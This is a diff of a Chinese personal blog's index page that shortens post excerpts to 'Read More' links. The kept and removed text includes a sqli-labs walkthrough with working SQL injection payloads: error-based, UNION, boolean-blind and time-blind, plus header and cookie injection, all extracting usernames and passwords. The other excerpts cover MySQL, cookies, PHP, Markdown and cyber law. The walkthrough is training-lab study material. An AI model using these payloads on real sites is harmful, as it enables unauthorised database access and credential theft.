@@ -79,27 +79,11 @@
         <p>sqli-libs<br>第一关：<br>报错注入：<br>输入?id=1页面正常<br>在1后面加’<br>报错注入:1’and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y)<br>获取数据库名:1’and(select extractvalue(1,concat(0x7e,(select database())))) –+<br>获取表名:1’and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))–+<br>获取列名:1’and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=”users”))))–+<br>获取数据值:1’and (select extractvalue(1,concat(0x7e,(select group_concat(id,username,0x3a,password) from users where username not in(‘Dumb’)))))–+</p>
 <p>联合查询：<br>union select 1,2,database()–+ 查库<br>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+查表<br>union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”users” –+ 查列<br>union select 1,group_concat(username),group_concat(password) from users –+  查数据</p>
 <p>第二关：<br>第二关与第一关差别不大，只需要在报错后去掉 ‘ 即可，其余不变</p>
-<p>第三关:<br>与第一关差别不大，只需要在1’后加上)即可，其余不变</p>
-<p>第四关：<br>同前三关一样 只需要把第三关的单引号变成双引号</p>
-<p>第五关：<br>采用报错注入，需要双注入，?id=-1’,其余同前四关一致</p>
-<p>第六关：<br>将第五关的单引号变成双引号即可</p>
-<p>第七关：<br>不知道</p>
-<p>第八关：<br>采用布尔盲注<br>获取数据库名<br>‘ and substr(database(),1,1)= “a” –+  security<br>获取表名<br>‘ and substr((select table_name from information_schema。tables where table_schema=’security’ limit x,1),1,1)=’a’–+  x为第几个表，第一个表是referer,第三个表是users，第二个表是uagents<br>获取列名<br>‘ and substr((select column_name from information_schema.columns where table_name=’users’ limit x,1),1,8)=’a’–+   x同上,第一列是username,第二列是password<br>获取数据<br>‘ and substr((select username from users limit 0,1),1,1)=’a’–+   dumb<br>‘ and substr((select password from users limit 0,1),1,1)=’a’–+   dumb</p>
-<p>第九关：<br>采用时间盲注<br>注入<br>‘and sleep(5)–+<br>获取数据库名<br>‘ and if((substr((select database()),1,1)=’a’),sleep(10),1)–+  security<br>获取表名<br>‘ and if((substr((select table_name from information_schema.tables where table_schema=’security’ limit x,1),1,1)=’a’),sleep(10),1)–+   第三个为users<br>获取列名<br>‘ and if((substr((select column_name from information_schema.columns where table_name=’users’ limit x,1),1,1)=’a’),sleep(10),1)–+  第一个为username,第二个password<br>获取数据<br>‘ and if((substr((select username from users limit 0,1),1,1)=’a’),sleep(10),1)–+<br>‘ and if((substr((select password from users limit 0,1),1,1)=’a’),sleep(10),1)–+<br>burp抓包可以看时间 f12点网络也可以看时间</p>
-<p>第十关：<br>同第九关采用时间盲注 只需要把 ‘ 变成 “即可</p>
-<p>第十一关:<br>输入admin admin登录 f12 hecbar不易观察 使用burp抓包在repeater<br>中更改post 在admin后加入’报错 采用报错注入即可</p>
-<p>第十二关：<br>与第十一关相同 只需要把注入改成”)即可</p>
-<p>第十三关：<br>同上 注入为’)</p>
-<p>第十四关：<br>同上 但需要注意注入语句和搜索语句需要在””内<br>例admin” and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y)–+”</p>
-<p>第十五关：<br>注入位置不变 采用时间盲注<br>uname=admin’ and if((substr((select database()),1,1)=’a’),sleep(10),1)–+</p>
-<p>第十六关：<br>同上 只需要把’变成”)</p>
-<p>第十七关：<br>注入位置变为passwd 需要注意最后的爆值正常语句不行 需要再加入一个select语句：and (select extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from(select group_concat(id,username,password)from users))))–+</p>
-<p>第十八关：<br>登录后根据页面回显 猜测注入点在user-agent 直接尝试可行 需要注意单引号注入 把语句括在单引号内’ ‘</p>
-<p>第十九关：<br>登录后回显在referer 步骤同上18关</p>
-<p>第二十关：<br>根据页面猜测是cookies注入 尝试后可在cookies报错注入</p>
-<p>第二十一关：<br>同上 将’改为’) 将报错语句base64编码后即可 注意此关–+不行需要编码#</p>
-<p>第二十二关：<br>同上 将’)变为”就行</p>
-
+        
+          <p class="article-more-link">
+            <a href="/2022/03/24/3.22/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
@@ -219,56 +203,11 @@
 <td>浮点数</td>
 </tr>
 </tbody></table>
-<p><strong>数值列类型</strong></p>
-<p>所有数值列类型的类型名及其说明和所占的字节数见下表</p>
-<table>
-<thead>
-<tr>
-<th>类型名</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>TINYINT</td>
-<td>非常小的整数</td>
-</tr>
-<tr>
-<td>SMALLINT</td>
-<td>较小的整数</td>
-</tr>
-<tr>
-<td>MEDIUMINT</td>
-<td>中等大小的整数</td>
-</tr>
-<tr>
-<td>INT</td>
-<td>标准整数</td>
-</tr>
-<tr>
-<td>BIGINT</td>
-<td>大整数</td>
-</tr>
-<tr>
-<td>FLOAT</td>
-<td>单精度浮点数</td>
-</tr>
-<tr>
-<td>DOUBLE</td>
-<td>双精度浮点数</td>
-</tr>
-<tr>
-<td>DECIMAL</td>
-<td>一个串的浮点数</td>
-</tr>
-</tbody></table>
-<h2 id="MySQL程序常用命令"><a href="#MySQL程序常用命令" class="headerlink" title="MySQL程序常用命令"></a>MySQL程序常用命令</h2><p>显示所有数据库：<code>show databases;</code></p>
-<p>选定默认数据库：<code>use dbname;</code></p>
-<p>显示默认数据库中所有表：<code>show tables;</code></p>
-<p>放弃正在输入的命令：<code>\c</code></p>
-<p>显示命令清单：<code>\h</code></p>
-<p>退出MySQL程序：<code>\q</code></p>
-<p>查看MySQL服务器状态信息：<code>\s</code></p>
-
+        
+          <p class="article-more-link">
+            <a href="/2022/03/19/Mysql%E5%9F%BA%E7%A1%80/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
@@ -300,58 +239,11 @@
 <p>4.Cookie是保存在客户端的，如果用户禁用了Cookie，那么Cookie也就失效了</p>
 <p>5.Cookie的生命周期到了，Cookie就会失效</p>
 <p>6.设置一个Cookie时失效时间为time()那么在页面浏览完之后就被删除</p>
-<h2 id="2-什么是Session"><a href="#2-什么是Session" class="headerlink" title="(2)什么是Session"></a>(2)什么是Session</h2><p><strong>1.什么是Session？</strong></p>
-<p>Session译为“会话”，其本意是指有始有终的一系列动作/消息</p>
-<p>Web中的Session指的就是用户在浏览某个网站时，从进入网站到浏览器关闭所经过的这段时间，也就是用户浏览这个网站所花费的时间</p>
-<p>因此Session实际上是一个特定的时间概念，Session默认的生命周期为20分钟</p>
-<p><strong>2.Session的作用</strong></p>
-<p>Session可以用于身份认证，程序状态记录，页面之间的参数传递等</p>
-<p>因为HTTP协议无状态，为了在服务器保持客户端的状态，就需要使用Session</p>
-<h2 id="3-总结Cookie和Session的异同点"><a href="#3-总结Cookie和Session的异同点" class="headerlink" title="(3)总结Cookie和Session的异同点"></a>(3)总结Cookie和Session的异同点</h2><table>
-<thead>
-<tr>
-<th>异同点</th>
-<th>Cookie</th>
-<th>Session</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>相同点</td>
-<td>能够保存用户信息的区别</td>
-<td>同Cookie</td>
-</tr>
-<tr>
-<td>存储位置</td>
-<td>存放在客户端浏览器</td>
-<td>存放在服务器</td>
-</tr>
-<tr>
-<td>保留时间</td>
-<td>设定有效保存期限</td>
-<td>关闭浏览器后自动作废</td>
-</tr>
-<tr>
-<td>存储容量</td>
-<td>每个浏览器只能保存某个Web服务器的最多20个Cookie且大小不超过4KB</td>
-<td>可以创建多个但是过多会影响服务器性能</td>
-</tr>
-<tr>
-<td>是否被禁用</td>
-<td>用户设置是否开启Cookie</td>
-<td>不会被禁用，因为内容保存在服务器端</td>
-</tr>
-<tr>
-<td>隐私策略</td>
-<td>对客户端可见，不安全</td>
-<td>存储在服务器，较安全</td>
-</tr>
-<tr>
-<td>跨域支持</td>
-<td>支持跨域名访问</td>
-<td>不支持跨域名访问</td>
-</tr>
-</tbody></table>
-
+        
+          <p class="article-more-link">
+            <a href="/2022/03/19/Cookie%E5%92%8CSession/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
@@ -379,17 +271,11 @@
       
         <h1 id="md文件基本语法"><a href="#md文件基本语法" class="headerlink" title="md文件基本语法"></a>md文件基本语法</h1><h2 id="（1）标题"><a href="#（1）标题" class="headerlink" title="（1）标题"></a>（1）标题</h2><p><img src="https://yslee0113.github.io/img/001.png" alt="img"></p>
 <h2 id="（2）粗体、斜体、删除和下划线"><a href="#（2）粗体、斜体、删除和下划线" class="headerlink" title="（2）粗体、斜体、删除和下划线"></a>（2）粗体、斜体、删除和下划线</h2><p><img src="https://yslee0113.github.io/img/002.png" alt="img"></p>
-<h2 id="（3）引用块"><a href="#（3）引用块" class="headerlink" title="（3）引用块"></a>（3）引用块</h2><p><img src="https://yslee0113.github.io/img/003.png" alt="img"></p>
-<h2 id="4-代码块"><a href="#4-代码块" class="headerlink" title="(4) 代码块"></a>(4) 代码块</h2><p><img src="https://yslee0113.github.io/img/004.png" alt="img"></p>
-<h2 id="5-公式块"><a href="#5-公式块" class="headerlink" title="(5)公式块"></a>(5)公式块</h2><p><img src="https://yslee0113.github.io/img/005.png" alt="img"></p>
-<h2 id="6-分割线"><a href="#6-分割线" class="headerlink" title="(6)分割线"></a>(6)分割线</h2><p><img src="https://yslee0113.github.io/img/006.png" alt="img"></p>
-<h2 id="7-列表"><a href="#7-列表" class="headerlink" title="(7)列表"></a>(7)列表</h2><p><img src="https://yslee0113.github.io/img/007.png" alt="img"></p>
-<h2 id="8-表格"><a href="#8-表格" class="headerlink" title="(8)表格"></a>(8)表格</h2><p><img src="https://yslee0113.github.io/img/008.png" alt="img"></p>
-<h2 id="9-超链接"><a href="#9-超链接" class="headerlink" title="(9)超链接"></a>(9)超链接</h2><p><img src="https://yslee0113.github.io/img/009.png" alt="img"></p>
-<h2 id="10-图片"><a href="#10-图片" class="headerlink" title="(10)图片"></a>(10)图片</h2><p><img src="https://yslee0113.github.io/img/010.png" alt="img"><br><strong>说明</strong>：在Hexo的Yilia模板中插入图片时，请按照以下的步骤进行设置</p>
-<h6 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h6><p>需先输入命令<code>npm install hexo-asset-image --save</code> 安装插件</p>
-<h6 id="步骤二"><a href="#步骤二" class="headerlink" title="步骤二"></a>步骤二</h6><p>需将图片放进/Myblog/themes/hexo-theme-yilia/source/img文件夹中，然后在文章中通过 Markdown 语法进行引用<br>例如在资源文件夹中添加图片example.png，则可以在对应的文章中使用<code>![示例图片](img/example.png)</code>语句添加图片</p>
-
+        
+          <p class="article-more-link">
+            <a href="/2022/03/19/md%E6%96%87%E4%BB%B6%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
@@ -421,118 +307,11 @@
 <p>​            使用<code>mysql_select_db()</code>函数选择MySQL数据库服务器上的数据库，并与数据库建立连接</p>
 <p>第三步：执行SQL语句</p>
 <p>​            在选择的数据库中使用<code>mysql_query()</code>函数执行SQL语句。</p>
-<p>对数据的操作方式主要包括四种方式：</p>
-<p>查询数据：使用select语句实现数据的查询功能</p>
-<p>插入数据：使用insert into语句向数据库中插入数据</p>
-<p>更新数据：使用update语句修改数据库中的记录</p>
-<p>删除数据：使用delete语句删除数据库中的记录</p>
-<h2 id="PHP目录的基本操作：操作目录"><a href="#PHP目录的基本操作：操作目录" class="headerlink" title="PHP目录的基本操作：操作目录"></a>PHP目录的基本操作：操作目录</h2><table>
-<thead>
-<tr>
-<th>函数</th>
-<th>说明</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>mkdir(pathname)</td>
-<td>新建一个指定的目录</td>
-<td><code>mkdir(&#39;temp&#39;)</code></td>
-</tr>
-<tr>
-<td>rmdir(dirname)</td>
-<td>删除目录，该目录必须为空</td>
-<td><code>rmdir(&#39;data&#39;)</code></td>
-</tr>
-<tr>
-<td>getcwd(void)</td>
-<td>取得当前文件所在的目录</td>
-<td><code>echo getcwd();</code></td>
-</tr>
-<tr>
-<td>chdir(dirname)</td>
-<td>改变当前目录</td>
-<td><code>chdir(&#39;../&#39;);</code></td>
-</tr>
-<tr>
-<td>opendir(path)</td>
-<td>打开目录，返回目录的指针</td>
-<td><code>$dirh=opendir(&#39;temp&#39;);</code></td>
-</tr>
-<tr>
-<td>closedir()</td>
-<td>关闭目录，参数为目录指针</td>
-<td><code>closedir($dirh);</code></td>
-</tr>
-<tr>
-<td>readdir()</td>
-<td>遍历目录</td>
-<td><code>$file=readdir($dirh);</code></td>
-</tr>
-<tr>
-<td>scandir(psth,sort)</td>
-<td>以数组形式遍历目录，sort参数可设置升序或降序排列</td>
-<td><code>$arr=acandir(&#39;D:\ICQ&#39;,1);</code></td>
-</tr>
-</tbody></table>
-<h2 id="PHP文件操作函数：操作文件"><a href="#PHP文件操作函数：操作文件" class="headerlink" title="PHP文件操作函数：操作文件"></a>PHP文件操作函数：操作文件</h2><table>
-<thead>
-<tr>
-<th>函数</th>
-<th>语法</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>copy()</td>
-<td>copy(源文件，目的文件)</td>
-<td>复制文件</td>
-</tr>
-<tr>
-<td>unlink()</td>
-<td>unlink(目标文件)</td>
-<td>删除文件</td>
-</tr>
-<tr>
-<td>rename()</td>
-<td>rename(旧文件名，新文件名)</td>
-<td>重命名文件或目录，或移动文件</td>
-</tr>
-<tr>
-<td>ftruncate()</td>
-<td>ftruncate(目标文件资源，截取长度)</td>
-<td>将文件截断到指定长度</td>
-</tr>
-<tr>
-<td>file_exists()</td>
-<td>file_exists(目标文件名)</td>
-<td>判断文件或文件夹是否存在</td>
-</tr>
-<tr>
-<td>is_file()</td>
-<td>is_file(文件名)</td>
-<td>判断指定的路径存在且为文件</td>
-</tr>
-<tr>
-<td>realpath()</td>
-<td>realpath(文件名)</td>
-<td>返回文件的物理路径</td>
-</tr>
-<tr>
-<td>pathinfo()</td>
-<td>pathinfo(文件名)</td>
-<td>以数组形式返回文件的路径和文件名信息</td>
-</tr>
-</tbody></table>
-<h2 id="PHP文件访问函数读取文件"><a href="#PHP文件访问函数读取文件" class="headerlink" title="PHP文件访问函数读取文件"></a>PHP文件访问函数读取文件</h2><p>读取文件常用函数</p>
-<p>fread() ：读取整个文件或文件中指定长度的字符串，可用于二进制文件读取</p>
-<p>fgets() ：读取文件中的一行字符</p>
-<p>fgetss() ：读取文件中的一行字符并去掉所有HTML和PHP标记</p>
-<p>fgetc() ：读取文件中的一个字符</p>
-<p>file_get_contents() ：将文件读入字符串</p>
-<p>file() ：把文件读入到一个数组中</p>
-<p>readfile() ：读取一个文件，并输出到输出缓冲</p>
-
+        
+          <p class="article-more-link">
+            <a href="/2022/03/19/PHP%E5%9F%BA%E7%A1%80/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
@@ -566,26 +345,11 @@
 <p>第一款:违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役;后果特别严重的，处五年以上有期徒刑。</p>
 <p>第二款:违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。</p>
 <p>第三款:故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。</p>
-<p>(2)《中华人 名共和国刑法》(七)</p>
-<p>在刑法第二百八十五条中增加两款作为第二款、第三款:“ 违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金;情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。</p>
-<p>“提供专门用于侵入、非法控制计算机信息系统的程序、工具，或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具，情节严重的，依照前款的规定处罚。”</p>
-<p>(3) 《中华人名共和国刑法》 (九)</p>
-<p>在刑法第二百八十五条中增加一款作为第四款:“ 单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照各该款的规定处罚。”</p>
-<p>在刑法第二百八十六条中增加一款作为第四款:“ 单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照第一款的规定处罚。”</p>
-<p>在刑法第二百八十六条后增加一条，作为第二百八十六条之一:“ 网络服务提供者不履行法律、行政法规规定的信息网络安全管理义务，经监管部门责令采取改正措施而拒不改正，有下列情形之一的， 处三年以下有期徒刑、拘役或者管制，并处或者单处罚金：</p>
-<p>(一)致使违法信息大量传播的;</p>
-<p>(二)致使用户信息泄露，造成严重后果的;</p>
-<p>(三)致使刑事案件证据灭失，情节严重的;</p>
-<p>(四)有其他严重情节的。</p>
-<p>单位犯前款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照前款的规定处罚。</p>
-<p>“有前两款行为，同时构成其他犯罪的，依照处罚较重的规定定罪处罚。”</p>
-<p>(4)《网络 安全法》</p>
-<p>《中华人民共和国网络安全法》由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于2016年11月7日通过，自2017年6月1日起施行。</p>
-<p>《中华人民共和国网络安全法》是为保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展而制定的法律。</p>
-<p>(5) 《中华人民共和国密码法》由中华人民共和国第十三届全国人民代表大会常务委员会第十四次会议于2019年10月26日通过，自2020年1月 1日起施行。</p>
-<p>(6)《中华人民共和国数据安全法》 ，2021年6月10日，第十三届全国人民代表大会常务委员会第二十九次会议通过该法律，自2021年9月1 日起施行。它规范数据处理活动，保障数据安全，促进数据开发利用，保护个人、组织的合法权益，维护国家主权、安全和发展利益，制定的法律。</p>
-<p>(7) 《个人信息保护法》，2021年8月20日，十三届全国人大常委会第三十次会议表决通过《中华人民共和国个人信息保护法》。自2021年11月 1日起施行。</p>
-
+        
+          <p class="article-more-link">
+            <a href="/2022/03/17/%E7%BD%91%E5%AE%89%E6%B3%95%E8%A7%A3%E8%AF%BB/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
